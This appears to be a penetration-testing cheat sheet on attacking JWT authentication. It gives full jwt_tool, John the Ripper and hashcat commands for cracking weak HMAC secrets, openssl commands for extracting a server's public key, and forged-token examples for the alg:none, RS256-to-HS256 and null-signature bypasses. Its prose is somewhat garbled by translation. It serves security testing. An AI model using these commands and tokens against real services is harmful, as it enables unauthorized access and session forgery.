# JWT

* JWTs contain encrypted information and are signed by a key.
* In order to forge a token, one must have the correct key(s).
* Secret key for HS256 (symmetric encryption).
* Public and private keys for RS256 (asymmetric encryption).
* If the JWT configuration is not implemented correctly, then there are many ways to bypass the controls and modify the token to gain unauthorized access.

### Weak HMAC Secret used as Key

Keys signed by HMAC( alg HS256/HS384/HS512) use symmetric encryption, which means that the key that signs the token is also used to verify it. These are often signed with simple passwords.

Since signature verification is a self-contained process, the token itself can be tested for valid passwords without having to send it to the application for verification.

Decryption HMAC JWTis therefore a completely offline matter and can be performed by an attacker on a LARGE SCALE.

There are many cracking tools out there JWT, and jwt_toolit is no exception. This is useful for a quick check against known leaked password lists or default passwords.

Use Cracking mode in jwt_toolconjunction with a dictionary file to try to verify the key against all words:

```bash
python3 jwt_tool.py JWT_HERE -C -d dictionary.txt
python jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LT > jwt.john
```

Another viable alternative is to use Hashcatand JohnTheRipperfor the process:

```
john -w=/usr/share/wordlists/rockyou.txt jwt.txt
python3 crackjwt.py jwt.txt /usr/share/wordlists/rockyou.txt
/opt/JohnTheRipper/run/john jwt.john


hashcat -a 0 -m 16500 jwt.txt wordlist.txt
hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6
```

## Finding Public Keys

To test some of the attack routes for tokens with asymmetric encryption, we may need to find the public key. There are several possible methods.

### SSL key reuse

In some cases, the token may be signed with the private key of the web server's SSL connection. Taking the public key certificate x509, and extracting this public key from SSL is quite simple:

```
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```

## Known Exploits
Several vulnerabilities affecting various libraries have been reported and disclosed JWT.

It is interesting to note that all of these affect the token by manipulating the header values. This is mainly because the header controls how or what a token is signed with. Attacks on target values ​​in the payload section are likely to be platform/service specific, rather than library specific.

It's also worth noting at this point that (in the absence of extremely verbose errors) you're unlikely to know which library JWT, let alone which version of that library, is signing tokens on a given service. For this reason, when testing the JWT, our best option is to try all the tricks and see if anything works.

### Algorithm 'none' (CVE-2015-9235)

This attack targets an option in the standard JWTto produce unsigned keys. The output literally omits any part of the signature after the second period.

Due to weaknesses in some libraries or server configurations, a service can read our altered request, see that it doesn't need to be signed, and then just reliably accept it.

Example:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJsb2dpbiI6InRpY2FycGkifQ.
```

Deconstructed:

```
{"typ": "JWT", "alg": "none" }.
{"login": "ticarpi"}.
[¡Sin firma!]
```

Set "alg": "none"unsigned, but don't change the payload. Is the page still valid? If the page is valid, then it is bypassed, and tampering begins.

```
$ python3 jwt_tool.py JWT_HERE -X a
```

### Algorithm Change RS256 to HS256

RS256you need a private key to manipulate the data and a public key to verify the authenticity of the signature.

Switching RS256to HS256 forces the app to use only one key to perform both tasks.

This way the workflow would convert from asymmetric to symmetric encryption and now we can sign the new tokens with the same public key.

You MUST get the key Public-Keyfor this attack:

```
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
python3 jwt_tool.py <JWT> -S hs256 -k public.pem
```

### Firma Nula (CVE-2020-28042)

This attack targets a logic error in vulnerable libraries that do not process the signature verification, when it is zero length.

Like the attack "alg: none", the output omits any part of the signature after the second period, although in this case the algorithm in the header is not changed.

Example:

```eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.```

Deconstructed:

```
{"typ": "JWT", "alg": "HS256" }.
{"login": "ticarpi"}.
[¡Sin firma!]
```

Remove the signature from the end of the token. If it's vulnerable, the app won't be able to check the signature, since it doesn't see anything that needs to be checked.

```$ python3 jwt_tool.py JWT_HERE -X n```

If the result of the page is valid, then it is bypassed and should proceed with tampering.




